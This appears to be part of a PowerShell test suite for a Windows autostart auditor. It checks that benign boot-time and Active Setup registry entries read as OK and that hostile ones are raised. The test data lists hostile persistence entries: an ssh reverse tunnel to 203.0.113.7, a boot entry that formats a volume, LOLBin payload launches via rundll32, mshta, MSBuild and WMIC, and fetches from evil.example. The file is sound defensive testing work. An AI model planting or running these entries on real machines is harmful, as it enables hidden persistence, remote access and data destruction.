    T 'a validly signed antivirus boot-time scanner is a WARNING naming its signer' ($b.Sev -eq 'WARNING' -and ($b.Lines -join ' ') -match 'signed by Gen Digital Inc\.') ($b.Lines -join ' | ')
    $b = BootOne 'autocheck autofmt \??\D: /FS:NTFS /Q'; $t = $b.Lines -join "`n"
    T "hostile boot: Microsoft's own autofmt told to format a volume is a WARNING, never INFO and never the all-clear" ($b.Sev -eq 'WARNING' -and $t -match "(?m)^\[WARNING\] BootExecute entry 'autocheck autofmt .* runs C:\\Windows\\System32\\autofmt\.exe before Windows starts, as SYSTEM -- signed by Microsoft Windows, but it is not the disk check" -and $t -notmatch 'hold only') $t
    $b = BootOne 'sdnative /boot'
    T 'any other Microsoft-signed System32 native program is a WARNING too' ($b.Sev -eq 'WARNING' -and ($b.Lines -join ' ') -match 'sdnative\.exe before Windows starts, as SYSTEM -- signed by Microsoft Windows, but it is not the disk check') ($b.Lines -join ' | ')
    $b = BootCase @{ BootExecute = @{ State = 'present'; Value = @('autocheck autochk *'); Kind = 'MultiString' }; SetupExecute = @{ State = 'present'; Value = @('C:\Windows\System32\poqexec.exe /display_progress \SystemRoot\WinSxS\pending.xml'); Kind = 'MultiString' } }
    T "Windows servicing's poqexec in SetupExecute is a WARNING that says to restart and run the audit again" ($b.Sev -eq 'WARNING' -and ($b.Lines -join ' ') -match "\[WARNING\] SetupExecute entry .* runs C:\\Windows\\System32\\poqexec\.exe .* Windows servicing can leave a program here while an update waits for a restart: restart, then run the audit again") ($b.Lines -join ' | ')
    $b = BootOne ('autocheck autochk' + [char]0xA0 + '/k')
    T 'hostile boot: autochk glued to a no-break space is another program name, raised' ($b.Sev -eq 'WARNING' -and ($b.Lines -join ' ') -notmatch 'hold only') ($b.Lines -join ' | ')
    $b = BootOne 'autocheck ..\..\ProgramData\Acme\native'
    T 'a Microsoft-signed file reached by climbing out of System32 is a WARNING on the file it really is' ($b.Sev -eq 'WARNING' -and ($b.Lines -join ' ') -match 'runs C:\\ProgramData\\Acme\\native\.exe before Windows starts' -and ($b.Lines -join ' ') -notmatch 'not the disk check') ($b.Lines -join ' | ')
    $b = BootOne 'autocheck "C:\Program Files\Acme\tool -x.exe" /x'
    T 'a quoted BootExecute image is read whole: the unsigned file it names is CRITICAL' ($b.Sev -eq 'CRITICAL' -and ($b.Lines -join ' ') -match 'runs C:\\Program Files\\Acme\\tool -x\.exe before Windows starts, as SYSTEM, and it is not validly signed') ($b.Lines -join ' | ')
    $b = BootCase @{ BootExecute = @{ State = 'present'; Value = @('autocheck nohere'); Kind = 'MultiString' } }
    T 'an image that is not on disk is a WARNING, never OK' ($b.Sev -eq 'WARNING' -and ($b.Lines -join ' ') -match 'not on disk') ($b.Lines -join ' | ')
    foreach ($e in @('autocheck \\203.0.113.7\share\boot', 'autocheck \??\UNC\203.0.113.7\share\boot.exe', 'autocheck \Device\HarddiskVolume3\x.exe', 'autocheck \??\Z:\boot.exe')) {
        $b = BootOne $e
        T "a BootExecute image that is not a plain local file ('$e') is a WARNING and is not opened" ($b.Sev -eq 'WARNING' -and ($b.Lines -join ' ') -match 'not a plain file on a local fixed drive -- not opened' -and @($b.Hits).Count -eq 0) ($b.Lines -join ' | ')
    }
    $b = BootCase @{ BootExecute = @{ State = 'present'; Value = 'autocheck autochk *'; Kind = 'String' }; SetupExecute = @{ State = 'present'; Value = @('autocheck evilnat'); Kind = 'MultiString' } }
    T 'a sibling value (SetupExecute) is graded by the same rule; a REG_SZ BootExecute is read' ($b.Sev -eq 'CRITICAL' -and ($b.Lines -join ' ') -match "SetupExecute entry 'autocheck evilnat'" -and ($b.Lines -join ' ') -match '\[OK\] BootExecute: autocheck autochk \*') ($b.Lines -join ' | ')
    $all = @{}; foreach ($n in $script:BootValues) { $all[$n] = @{ State = 'absent' } }
    $all.BootExecute = @{ State = 'present'; Value = @('autocheck autochk *', ''); Kind = 'MultiString' }
    $b = BootCase $all
    T 'the stock machine: autochk only, siblings absent, an empty string in the list -- the all-clear, nothing raised' ($b.Sev -eq 'OK' -and $b.Gap -eq 'OK' -and ($b.Lines -join "`n") -match "(?m)^\[OK\] BootExecute and its sibling values hold only Windows' own entries \(1 graded\)\.$") ($b.Lines -join ' | ')
    $b = BootCase @{ BootExecute = @{ State = 'present'; Value = [byte[]](97, 0, 98, 0, 99, 0, 0, 0); Kind = 'Binary' } }
    T 'a BootExecute stored as bytes is ONE WARNING that it is not text, never a line per byte' ($b.Sev -eq 'WARNING' -and @($b.Lines).Count -eq 1 -and $b.Lines[0] -match '^\[WARNING\] BootExecute entry is not text: the value is stored as Binary') ($b.Lines -join ' | ')
    $before = $script:opened.Count
    $b = BootOne ('autocheck ' + ('a' * 600))
    T 'an over-long BootExecute entry is a WARNING, not parsed and not probed' ($b.Sev -eq 'WARNING' -and ($b.Lines -join ' ') -match 'entry is 610 characters long -- not parsed' -and $script:opened.Count -eq $before) ($b.Lines -join ' | ')
    $many = @('autocheck autochk *') * 70
    $b = BootCase @{ BootExecute = @{ State = 'present'; Value = $many; Kind = 'MultiString' } }
    T 'more BootExecute entries than any Windows holds: the first 64 are graded and the rest is said, never an all-clear' ($b.Sev -eq 'WARNING' -and ($b.Lines -join ' ') -match 'entry list holds 70 entries; only the first 64 were graded' -and ($b.Lines -join ' ') -notmatch 'hold only') (($b.Lines | Select-Object -Last 2) -join ' | ')
    $b = BootCase @{ BootExecute = @{ State = 'unreadable'; Error = 'SecurityException: Requested registry access is not allowed.' } }
    T 'an unreadable Session Manager key is a raised gap, never the all-clear' ($b.Gap -eq 'WARNING' -and $b.Sev -eq 'OK' -and ($b.Lines -join ' ') -match 'BootExecute check NOT performed' -and ($b.Lines -join ' ') -notmatch '\[OK\]') ($b.Lines -join ' | ')
    $b = BootCase @{ BootExecute = @{ State = 'nokey' } }
    T 'a missing Session Manager key is a gap (every Windows has it)' ($b.Gap -eq 'WARNING' -and ($b.Lines -join ' ') -match 'NOT performed') ($b.Lines -join ' | ')
    $b = BootCase @{ BootExecute = @{ State = 'absent' } }
    T 'an absent BootExecute value is INFO, no gap, no finding' ($b.Gap -eq 'OK' -and $b.Sev -eq 'OK' -and ($b.Lines -join ' ') -match '\[INFO\] BootExecute value absent') ($b.Lines -join ' | ')
    $b = BootOne ("autocheck evil`nnat")
    T 'a line break inside a BootExecute entry cannot start a report line of its own' (@($b.Lines | Where-Object { $_ -match "[`r`n]" }).Count -eq 0) ($b.Lines -join ' | ')

    # ---- Active Setup: benign twins, verbatim: must read [OK], on the file named ----
    # MEASURED on the CI runner (2026-11-28): the first nine. RECALLED from
    # Windows 10 and 11 desktops, not measured: the themeui, shell32,
    # WinMail, ClearIconCache and iedkcs32 lines.
    $benign = @(
        @('C:\Windows\System32\ie4uinit.exe -UserConfig', 'ie4uinit.exe'),
        @('C:\Windows\system32\unregmp2.exe /FirstLogon', 'unregmp2.exe'),
        @('"C:\Windows\System32\rundll32.exe" "C:\Windows\System32\iesetup.dll",IEHardenAdmin', 'iesetup.dll'),
        @('"C:\Windows\System32\rundll32.exe" "C:\Windows\System32\iesetup.dll",IEHardenUser', 'iesetup.dll'),
        @('C:\Windows\System32\Rundll32.exe C:\Windows\System32\mscories.dll,Install', 'mscories.dll'),
        @('C:\Windows\SysWOW64\Rundll32.exe C:\Windows\SysWOW64\mscories.dll,Install', 'mscories.dll'),
        @('"C:\Program Files (x86)\Microsoft\Edge\Application\158.0.4370.33\Installer\setup.exe" --configure-user-settings --verbose-logging --system-level --msedge', 'setup.exe'),
        @('"C:\Program Files (x86)\Microsoft\Edge\Application\158.0.4370.33\Installer\setup.exe" --configure-user-settings --verbose-logging --system-level --msedge --channel=stable', 'setup.exe'),
        @('"C:\Program Files\Google\Chrome\Application\158.0.8127.89\Installer\chrmstp.exe" --configure-user-settings --verbose-logging --system-level', 'chrmstp.exe'),
        @('%SystemRoot%\system32\unregmp2.exe /FirstLogon', 'unregmp2.exe'),
        @('%SystemRoot%\system32\regsvr32.exe /s /n /i:/UserInstall %SystemRoot%\system32\themeui.dll', 'themeui.dll'),
        @('regsvr32.exe /s /n /i:U shell32.dll', 'shell32.dll'),
        @('"C:\Program Files\Windows Mail\WinMail.exe" OCInstallUserConfigOE', 'WinMail.exe'),
        @('C:\Windows\system32\cmd.exe /D /C start C:\Windows\system32\ie4uinit.exe -ClearIconCache', 'ie4uinit.exe'),
        @('"C:\Windows\System32\rundll32.exe" "C:\Windows\System32\iedkcs32.dll",BrandIEActiveSetup SIGNUP', 'iedkcs32.dll'),
        @('rundll32 iesetup.dll,IEHardenUser', 'iesetup.dll'),
        @('C:\Windows\System32\ie4uinit.exe -BaseSettings', 'ie4uinit.exe'))
    foreach ($bn in $benign) {
        $v = StubCase $bn[0]
        $m = [regex]::Match($v.Line, "^\[OK\] Active Setup 'dz': (.+?) \(signed by [^)]+\) <- ")
        T "Active Setup '$($bn[0])' reads [OK] on $($bn[1])" ($v.Sev -eq 'OK' -and $m.Success -and (Get-WinLeaf $m.Groups[1].Value) -eq $bn[1]) $v.Line
    }
    # Validly signed all the way down and nothing that could carry a payload,
    # but not a line Windows, Edge or Chrome is known to keep: listed with
    # what it loads, never raised and never called [OK].
    foreach ($un in @('rundll32 C:\Windows\System32\shell32.dll,Control_RunDLL', 'rundll32.exe shell32,Control_RunDLL', 'C:\Windows\System32\ie4uinit.exe -show',
                      'C:\Windows\System32\ie4uinit.exe', 'C:\Windows\System32\ie4uinit.exe -UserConfig -reinstall', 'regsvr32.exe /s shell32.dll', 'regsvr32.exe /s /n /i:U shell32.dll themeui.dll',
                      'rundll32.exe "C:\Program Files\Vendor\iesetup.dll",IEHardenUser', 'msiexec.exe /i "C:\Program Files\Vendor\signed.msi" /qn ALLUSERS=1 REBOOT=ReallySuppress',
                      '"C:\Program Files\Google\Chrome\Application\158.0.8127.89\Installer\chrmstp.exe" --uninstall --system-level',
                      '"C:\Program Files (x86)\Microsoft\Edge\Application\158.0.4370.33\Installer\setup.exe" --uninstall --msedge --system-level --force-uninstall')) {
        $v = StubCase $un
        T "a signed line that is not one Windows, Edge or Chrome keeps is INFO, listed and not cleared: '$un'" ($v.Sev -eq 'OK' -and $v.Line -match "^\[INFO\] Active Setup 'dz' runs C:\\.+ \(signed by [^)]+\).* -- validly signed, but not a line this check has on record for Windows, Edge or Chrome: listed, not cleared <- ") $v.Line
    }
    # Another vendor's validly signed program, handed nothing recognisable as
    # code, an address or a host: listed with its signer, never raised and
    # never called [OK].
    foreach ($vn in @('"C:\Program Files\Vendor\app.exe" /config C:\ProgramData\Vendor\cfg.xml', '"C:\Program Files\Vendor\app.exe" --cfg=C:\\ProgramData\\Vendor\\cfg.xml',
                      '"C:\Program Files\Vendor\app.exe" /cmd /install', '"C:\Program Files\Vendor\app.exe" --at=12:30 --level:10', 'C:\Program Files\Vendor\app.exe /first',
                      '"C:\Program Files\A  B\x.exe" /first')) {
        $v = StubCase $vn
        T "another vendor's signed program is INFO naming its signer, not raised and not [OK]: '$vn'" ($v.Sev -eq 'OK' -and $v.Line -match "^\[INFO\] Active Setup 'dz' runs C:\\Program Files\\.+\.exe \(signed by Example Vendor Ltd\), another vendor's program: .* <- ") $v.Line
    }
    $v = StubCase 'C:\Windows\system32\unregmp2.exe /ShowWMP' '0'
    T "the runner's switched-off entry (IsInstalled=0) is INFO" ($v.Sev -eq 'OK' -and $v.Line -match '^\[INFO\] .*IsInstalled=0') $v.Line
    foreach ($ao in @('/UserInstall', 'U')) {
        $v = StubCase $ao
        T "the runner's argument-only StubPath '$ao' (Themes Setup / Windows Desktop Update) is INFO, not raised" ($v.Sev -eq 'OK' -and $v.Line -match '^\[INFO\] .*names no program, only arguments \(.*\) -- nothing by that name') $v.Line
    }
    foreach ($st in @('"C:\Program Files\Old\gone.exe" /x', 'C:\Program Files\Old App\gone.exe /x', 'C:\Program Files\Old App\gone.exe -x',
                      'C:\Program Files\Old App\gone.exe C:\ProgramData\Old\cfg.xml', 'C:\Program Files\Old App\gone.exe "first run"', 'C:\Windows\System32\gone.exe /UserInstall')) {
        $v = StubCase $st
        T "a program that is gone from an administrator-only folder is INFO (stale), never OK and never raised: '$st'" ($v.Sev -eq 'OK' -and $v.Line -match '^\[INFO\] .*\\gone\.exe, which is not on disk -- a stale entry') $v.Line
    }
    $v = StubCase 'regsvr32.exe /s C:\Windows\System32\gone.dll'
    T 'a DLL host whose DLL is gone from System32 is INFO (stale)' ($v.Sev -eq 'OK' -and $v.Line -match '^\[INFO\] .*gone\.dll, which is not on disk -- a stale entry') $v.Line
    foreach ($mc in @("msiexec.exe /fup $guid /qn", "MsiExec.exe /fu$guid", "msiexec.exe /i $guid /qn")) {
        $v = StubCase $mc
        T "msiexec by product code is INFO that says the package is not traced, never [OK]: '$mc'" ($v.Sev -eq 'OK' -and $v.Line -match '^\[INFO\] .*by its product code .* is not traced by this check') $v.Line
    }
    $script:disk['c:\progra~1\window~1\winmail.exe'] = @{ State = 'signed'; CN = 'Microsoft Windows'; Microsoft = $true; OriginalName = 'WinMail.exe'; RealPath = 'C:\Program Files\Windows Mail\WinMail.exe' }
    $v = StubCase 'C:\PROGRA~1\WINDOW~1\WinMail.exe OCInstallUserConfigOE'
    T 'a short (8.3) path is judged on the folder it really names' ($v.Sev -eq 'OK' -and $v.Line -match '^\[OK\] .*C:\\Program Files\\Windows Mail\\WinMail\.exe') $v.Line

    # ---- hostile lines: every one must be raised ----
    # The retrospective's 17 (2026-11-28), of which the first version read
    # [OK] or [INFO] for 11, and the classes the review of the second
    # version's final tree found (its numbers in the comments).
    $msTool = 'a Microsoft program this check knows no Active Setup use for'
    $noAcct = 'something this check cannot account for'
    $notPlain = 'not a plain file on a local fixed drive'
    $hostile = @(
        @('C:\Windows\system32\cmd.exe /D /C start C:\Windows\System32\rundll32.exe C:\ProgramData\Acme\evil.dll,Run', 'hands rundll32\.exe a file that is not validly signed \(C:\\ProgramData\\Acme\\evil\.dll\)'),
        @('cmd.exe /D /C start C:\Windows\System32\wscript.exe C:\ProgramData\Acme\x.vbs', 'script host'),
        @('cmd.exe /D /C start C:\Windows\System32\cmd.exe /c C:\ProgramData\Acme\x.bat', 'script host'),
        @('cmd.exe /D /C start C:\Windows\System32\mshta.exe C:\ProgramData\Acme\x.hta', 'script host'),
        @('C:\Program Files\Common Files\Acme\cache.dat -k', 'runs C:\\Program Files\\Common Files\\Acme\\cache\.dat .* not validly signed'),
        @('"C:\Program Files\Common Files\Acme\cache.dat" -k', 'not validly signed'),
        @('pcalua.exe -a C:\ProgramData\Acme\evil.exe', "runs C:\\Windows\\System32\\pcalua\.exe, $msTool"),
        @('explorer.exe C:\ProgramData\Acme\evil.exe', "runs C:\\Windows\\explorer\.exe, $msTool"),
        @('msiexec.exe /i C:\ProgramData\Acme\x.msi /qn', 'hands msiexec\.exe a file that is not validly signed'),
        @('forfiles.exe /p C:\Windows /m notepad.exe /c C:\ProgramData\Acme\evil.exe', "forfiles\.exe, $msTool"),
        @('C:\Windows\System32\wbem\WMIC.exe process call create C:\ProgramData\Acme\evil.exe', "WMIC\.exe, $msTool"),
        @('conhost.exe --headless C:\ProgramData\Acme\evil.exe', "conhost\.exe, $msTool"),
        @('evil.payload /s', 'names a program without its folder'),
        @('rundll32 C:\ProgramData\Acme\evil.dll,Run', 'hands rundll32\.exe a file that is not validly signed'),
        @('mshta.exe C:\ProgramData\Acme\x.hta', 'script host'),
        @('regsvr32.exe /s C:\ProgramData\Acme\evil.dll', 'hands regsvr32\.exe a file that is not validly signed'),
        @('C:\ProgramData\Acme\evil.exe', 'runs C:\\ProgramData\\Acme\\evil\.exe .* not validly signed'),
        # each host again behind `cmd /C start`, and what cmd finds by its own rules (3)
        @('cmd.exe /C start pcalua.exe -a C:\ProgramData\Acme\evil.exe', 'script host'),
        @('cmd.exe /D /C start msiexec.exe /i C:\ProgramData\Acme\x.msi', 'script host'),
        @('cmd.exe /D /C start C:\ProgramData\Acme\evil.exe', 'runs C:\\ProgramData\\Acme\\evil\.exe .* not validly signed'),
        @('cmd.exe /D /C start cmd.exe /D /C start cmd.exe /D /C start C:\Windows\System32\ie4uinit.exe', 'script host'),
        @('cmd.exe /D /C start C:\Windows\System32\cmd.exe /D /C start C:\Windows\System32\ie4uinit.exe', 'script host'),
        @('cmd.exe /C start "" C:\Windows\System32\ie4uinit.exe', 'script host'),
        @('cmd.exe /D /C start /min C:\Windows\System32\ie4uinit.exe', 'script host'),
        @('C:\Windows\system32\cmd.exe /D /C start C:\Windows\system32\ie4uinit.exe -ClearIconCache & C:\ProgramData\Acme\evil.exe', 'script host'),
        @('cmd.exe /D /C start %NOSUCHVAR_DZ%\x.exe', 'script host'),
        @('cmd.exe /D /C start C:\Windows\System32\run', 'script host'),
        @('cmd.exe /D /C start updater', 'script host'),
        @('cmd.exe /D /C start dzproto:', 'script host'),
        @('cmd.exe /D /C start ie4uinit -ClearIconCache', 'script host'),
        @('cmd.exe /D /C start C:\Windows\System32\gone.exe -x', 'script host'),
        @('cmd.exe /c C:\ProgramData\Vendor\setup.cmd', 'script host.*cmd\.exe /c C:\\ProgramData\\Vendor\\setup\.cmd'),
        @('C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -File C:\ProgramData\Acme\x.ps1', 'script host'),
        @('C:\ProgramData\Vendor\agent.exe /user', 'not validly signed \(NotSigned\)'),
        @('"C:\Program Files\Vendor\locked.exe"', 'could not be read'),
        # a DLL host is [OK] only for one signed DLL, an entry point and nothing after it (5)
        @('C:\Windows\System32\rundll32.exe', "$noAcct \(no DLL\)"),
        @('"C:\Windows\System32\rundll32.exe" "C:\Windows\System32\shell32.dll",Control_RunDLL C:\ProgramData\Acme\x.cpl', "$noAcct \(C:\\ProgramData\\Acme\\x\.cpl\)"),
        @('rundll32.exe C:\Windows\System32\shell32.dll,Control_RunDLL C:\ProgramData\Vendor\later.cpl', $noAcct),
        @('rundll32.exe advpack.dll,LaunchINFSection C:\ProgramData\Acme\evil.inf,DefaultInstall', $noAcct),
        @('rundll32.exe nosuch.dll,Entry', 'names nosuch\.dll for rundll32\.exe without its folder'),
        @('rundll32.exe pcwutl.dll,LaunchApplication powershell.exe', "$noAcct \(powershell\.exe\)"),
        @('rundll32.exe pcwutl.dll,LaunchApplication C:\Windows\System32\OpenSSH\ssh.exe', "$noAcct \(C:\\Windows\\System32\\OpenSSH\\ssh\.exe\)"),
        @('rundll32.exe advpack.dll,RegisterOCX "ssh.exe -N -R 2222:localhost:3389 user@203.0.113.7"', $noAcct),
        @('rundll32.exe pcwutl.dll,LaunchApplication calc', "$noAcct \(calc\)"),
        @("rundll32.exe -sta $guid", $noAcct),
        @('rundll32.exe shell32.dll Control_RunDLL', $noAcct),
        @('rundll32.exe shell32.dll,#61', $noAcct),
        @('rundll32.exe C:\Program Files\Acme\evil.dll,Run', $noAcct),
        @('"C:\Windows\System32\rundll32.exe" "C:\Windows\System32\iedkcs32.dll",BrandIEActiveSetup SIGNUP C:\ProgramData\Acme\evil.exe', $noAcct),
        @('"C:\Windows\System32\rundll32.exe" "C:\Windows\System32\iesetup.dll",BrandIEActiveSetup SIGNUP', $noAcct),
        # a Microsoft program is [OK] only at its own location (4)
        @('pcalua.exe -a C:\Windows\System32\cmd.exe', "pcalua\.exe, $msTool"),
        @('forfiles.exe /p C:\Windows /m notepad.exe', "forfiles\.exe, $msTool"),
        @('C:\Windows\System32\OpenSSH\ssh.exe -N -R 2222:localhost:3389 user@203.0.113.7', "runs C:\\Windows\\System32\\OpenSSH\\ssh\.exe, $msTool"),
        @('"C:\Program Files\OpenSSH\ssh.exe" -N -R 2222:localhost:3389 user@203.0.113.7', "runs C:\\Program Files\\OpenSSH\\ssh\.exe, $msTool"),
        @('"C:\Program Files\OpenSSH-Vendor\ssh.exe" -N -R 2222:localhost:3389 user@203.0.113.7', 'hands ssh\.exe a network endpoint \(localhost:3389\)'),
        @('reg.exe add HKCU\Software\Example /v Flag /d 1 /f', "runs C:\\Windows\\System32\\reg\.exe, $msTool"),
        @('reg.exe import C:\ProgramData\Vendor\cfg.xml', "reg\.exe, $msTool"),
        @('xcopy.exe "C:\Program Files\Vendor\Defaults" "C:\Users\victim\AppData\Roaming\Vendor" /E /I /Y', "runs C:\\Windows\\System32\\xcopy\.exe, $msTool"),
        @('"C:\Program Files\Internet Explorer\iexplore.exe" https://evil.example/landing', "iexplore\.exe, $msTool"),
        @('C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\ProgramData\Acme\evil.xml', "MSBuild\.exe, $msTool"),
        @('"D:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE" /recycle', "OUTLOOK\.EXE, $msTool"),
        @('C:\ProgramData\Acme\ie4uinit.exe -BaseSettings', "runs C:\\ProgramData\\Acme\\ie4uinit\.exe, $msTool.* outside the Windows and Program Files folders of the system drive"),
        @('"C:\Program Files\Acme\ie4uinit.exe" -BaseSettings', "runs C:\\Program Files\\Acme\\ie4uinit\.exe, $msTool"),
        @('C:\Windows\Help\unregmp2.exe /FirstLogon', "runs C:\\Windows\\Help\\unregmp2\.exe, $msTool"),
        @('"C:\Program Files\Acme\helper.exe" /c echo hi', "which is Microsoft's cmd\.exe under another name"),
        @('C:\Windows\SysWOW64\unregmp2.exe -a calc', "which is Microsoft's pcalua\.exe under another name"),
        @('"C:\Program Files\Google\Chrome\Application\9.9\Installer\chrmstp.exe" --run=C:\ProgramData\Acme\evil.exe', 'hands chrmstp\.exe a file that is not validly signed'),
        # one of the known programs with an argument that is not a plain switch
        @('C:\Windows\System32\ie4uinit.exe -url ftp://203.0.113.7/x', "$noAcct \(ftp://203\.0\.113\.7/x\)"),
        @('C:\Windows\System32\ie4uinit.exe "-UserConfig"', $noAcct),
        @('C:\Windows\System32\ie4uinit.exe -UserConfig "unclosed', "$noAcct \(a quote that is never closed\)"),
        @(('C:\Windows\System32\ie4uinit.exe' + (' -a' * 60)), "$noAcct \(more than 48 arguments\)"),
        @('"C:\Program Files (x86)\Microsoft\Edge\Application\158.0.4370.33\Installer\setup.exe" --do=C:\ProgramData\Acme\evil.exe', $noAcct),
        # what a host is handed must be a plain local signed file (6)
        @('msiexec.exe /i \\203.0.113.7\share\x.msi', "hands msiexec\.exe a path that is $notPlain \(\\\\203\.0\.113\.7\\share\\x\.msi\) -- not opened"),
        @('msiexec.exe /i //203.0.113.7/share/x.dat /qn', "$noAcct \(//203\.0\.113\.7/share/x\.dat\)"),
        @('msiexec.exe /i ..\..\ProgramData\Acme\evil.dat /qn', $noAcct),
        @('msiexec.exe /i ..\..\ProgramData\Acme\x.msi /qn', 'a relative path'),
        @('msiexec.exe /i C:\ProgramData\Acme\evil.dat /qn', "$noAcct \(C:\\ProgramData\\Acme\\evil\.dat\)"),
        @('msiexec.exe /qn', "$noAcct \(no package\)"),
        @('msiexec.exe /i "C:\Program Files\Vendor\signed.msi" /qn SERVER=203.0.113.7', "$noAcct \(SERVER=203\.0\.113\.7\)"),
        @('msiexec.exe /i "C:\Program Files\Vendor\signed.msi" /qn SERVER=relay.example.net', "$noAcct \(SERVER=relay\.example\.net\)"),
        # validly signed, but where any user can replace it or place a file beside it
        @('msiexec.exe /i C:\ProgramData\Vendor\signed.msi /qn', 'hands msiexec\.exe a file \(signed by Example Vendor Ltd\) in a folder a standard user may be able to write to \(C:\\ProgramData\\Vendor\\signed\.msi\)'),
        @('regsvr32.exe /s C:\ProgramData\Vendor\signed.dll', 'hands regsvr32\.exe a file \(signed by Example Vendor Ltd\) in a folder a standard user may be able to write to'),
        @('C:\ProgramData\Vendor\signedtool.exe /x', 'runs C:\\ProgramData\\Vendor\\signedtool\.exe \(signed by Example Vendor Ltd\) from a folder a standard user may be able to write to'),
        @('D:\Tools\Vendor\app.exe /x', 'runs D:\\Tools\\Vendor\\app\.exe \(signed by Example Vendor Ltd\) from a folder a standard user may be able to write to'),
        @('regsvr32.exe /s shell32.dll ..\..\ProgramData\Acme\evil.dat', 'a relative path \(\.\.\\\.\.\\ProgramData\\Acme\\evil\.dat\)'),
        @('regsvr32.exe /s "C:\Program Files\Acme\evil"', 'not validly signed \(C:\\Program Files\\Acme\\evil\.dll\)'),
        @('regsvr32.exe /s /i:C:\ProgramData\Acme\x.sct shell32.dll', $noAcct),
        @('rundll32.exe Z:\tools\x.dll,Run', "$notPlain \(Z:\\tools\\x\.dll\) -- not opened"),
        @('rundll32.exe C:\ProgramData\Vendor\cfg.xml:evil.dll,Run', $notPlain),
        @('regsvr32.exe /s %APPDATA%\Vendor\x.dll', "a file inside each user's own profile"),
        # a path that is not a plain file on a local fixed drive is named, never opened
        @('\\203.0.113.7\share\evil.exe /s', "names a program that is $notPlain \(\\\\203\.0\.113\.7\\share\\evil\.exe\) -- not opened"),
        @('//203.0.113.7/share/evil.exe /s', "names a program that is $notPlain \(\\\\203\.0\.113\.7\\share\\evil\.exe\) -- not opened"),
        @('\\?\C:\ProgramData\Acme\evil.exe', $notPlain),
        @('Z:\tools\setup.exe', "$notPlain \(Z:\\tools\\setup\.exe\) -- not opened"),
        @('E:\autorun\setup.exe /s', $notPlain),
        @('C:\Windows\System32\CON', $notPlain),
        @('C:\ProgramData\Vendor\cfg.xml:evil.exe', $notPlain),
        @('Z:evil.exe', $notPlain),
        @('CON', $notPlain),
        @('NUL.exe /s', $notPlain),
        @('x.txt:evil.exe', $notPlain),
        @(('C:\ProgramData\' + ('a' * 300) + '\x.exe'), $notPlain),
        @('"C:\Program Files\LinkDir\tool.exe" /s', 'names a program whose path runs through a link or a placeholder \(C:\\Program Files\\LinkDir\\tool\.exe\) -- not followed'),
        # another vendor's program: what it is handed (11)
        @('"C:\Program Files\Python312\python.exe" \\203.0.113.7\share\x.py', 'script host \(python\.exe, an interpreter\)'),
        @('"C:\Program Files\Python312\python.exe" Z:\x.py', 'script host \(python\.exe, an interpreter\)'),
        @('"C:\Program Files\Python312\python.exe" evil.py', 'script host \(python\.exe, an interpreter\)'),
        @('"C:\Program Files\Python312\python.exe" C:\ProgramData\Acme\evil.pyw', 'script host \(python\.exe, an interpreter\)'),
        @('"C:\Program Files\Vendor\app.exe" --launcher="cmd /c C:\ProgramData\Acme\x.bat"', 'hands app\.exe a file that is not validly signed \(C:\\ProgramData\\Acme\\x\.bat\)'),
        @('"C:\Program Files\Vendor\app.exe" --launcher="cmd /c echo hi"', 'hands the work on to another host \(cmd\) through app\.exe'),
        @('"C:\Program Files\Vendor\app.exe" --run="cmd /c C:\Program Files\Vendor\app.exe"', 'hands the work on to another host \(cmd\) through app\.exe'),
        @('"C:\Program Files\Vendor\app.exe" --exec="C:\ProgramData\Acme\evil.exe --quiet"', 'hands app\.exe a file that is not validly signed \(C:\\ProgramData\\Acme\\evil\.exe\)'),
        @('"C:\Program Files\Vendor\app.exe" C:\Windows\System32\cmd.exe', 'hands the work on to another host \(C:\\Windows\\System32\\cmd\.exe\) through app\.exe'),
        @('"C:\Program Files\Vendor\app.exe" C:\ProgramData\Acme\evil.js', 'hands app\.exe a file that is not validly signed \(C:\\ProgramData\\Acme\\evil\.js\)'),
        @('"C:\Program Files\Vendor\app.exe" /load C:\ProgramData\Acme\payload.dat', 'hands app\.exe a file that is not validly signed \(C:\\ProgramData\\Acme\\payload\.dat\)'),
        @('"C:\Program Files\Vendor\app.exe" /load C:\ProgramData\Vendor\later.dll', 'hands app\.exe a file that is not there \(C:\\ProgramData\\Vendor\\later\.dll\)'),
        @('"C:\Program Files\Vendor\app.exe" --update-url=https://evil.example/u', 'hands app\.exe an address \(https://evil\.example/u\)'),
        @('"C:\Program Files\Vendor\app.exe" --src=\\203.0.113.7\share', "hands app\.exe a path that is $notPlain \(\\\\203\.0\.113\.7\\share\)"),
        @('"C:\Program Files\Vendor\app.exe" Z:\x.dat', "hands app\.exe a path that is $notPlain \(Z:\\x\.dat\)"),
        @('"C:\Program Files\Vendor\app.exe" --connect 203.0.113.7', 'hands app\.exe a network endpoint \(203\.0\.113\.7\)'),
        @('"C:\Program Files\Vendor\app.exe" plugin.dll', 'a code file by a relative name \(plugin\.dll\)'),
        @('"C:\Program Files\Vendor\app.exe" "unclosed', 'arguments this check cannot read'),
        # a missing target where a file placed later would run; names without a folder (2, 7, 8)
        @('C:\ProgramData\Vendor\gone.exe', 'names C:\\ProgramData\\Vendor\\gone\.exe, which is not on disk, in a folder a standard user may be able to write to: a file placed there later runs'),
        @('C:\Windows\Tasks\gone.exe', 'names C:\\Windows\\Tasks\\gone\.exe, which is not on disk, in a folder a standard user may be able to write to'),
        @('C:\Windows\Tasks.\gone.exe', 'names C:\\Windows\\Tasks\\gone\.exe, which is not on disk, in a folder a standard user may be able to write to'),
        @('/ProgramData/Vendor/gone.exe', 'names C:\\ProgramData\\Vendor\\gone\.exe, which is not on disk, in a folder a standard user may be able to write to'),
        @('D:\Program Files\Vendor\gone.exe', 'which is not on disk, in a folder a standard user may be able to write to'),
        @('/UserInstall /x', 'which is not on disk, in a folder a standard user may be able to write to'),
        @('sub\folder\tool.exe /x', 'names a program by a relative path \(sub\\folder\\tool\.exe\)'),
        @('%NOSUCHVAR_DZ%\x.exe', 'by a relative path'),
        @('nohere.exe /s', 'names a program without its folder \(nohere\.exe\)'),
        @('updater /s', 'names a program without its folder \(updater\)'),
        @('%NOSUCHVAR_DZ%', 'names a program without its folder'),
        @('u', 'names a program without its folder \(u\)'),
        @('C:\ProgramData\Acme\x.vbs', 'runs a script file'),
        @('C:/Program Files/Acme.v2/evil /s', 'runs C:\\Program Files\\Acme\.v2\\evil\.exe .* not validly signed'),
        @('C:\Program Files\Acme\tool -x', 'runs C:\\Program Files\\Acme\\tool -x\.exe .* not validly signed'),
